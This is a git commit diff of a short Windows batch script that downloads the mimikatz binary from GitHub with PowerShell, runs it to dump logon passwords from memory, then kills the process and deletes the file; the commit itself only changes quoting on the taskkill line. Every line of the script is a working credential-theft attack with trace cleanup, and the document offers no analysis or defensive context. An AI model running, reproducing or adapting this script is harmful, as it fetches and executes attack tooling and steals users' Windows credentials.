bc970d91aa151270b49c36c72f76e8fad6e9ea5e
hightidAOaa <162752774+hightidAOaa@users.noreply.github.com>
2024-03-30 08:06:30 -0500

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,4 +1,4 @@
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe' -OutFile 'C:\mimikatze.exe'"
 powershell -command "C:\mimikatze.exe sekurlsa::logonpasswords exit"
-powershell -command "taskkill /IM "mimikatze.exe" /F"
+powershell -command "taskkill /IM 'mimikatze.exe' /F"
 del C:\mimikatze.exe
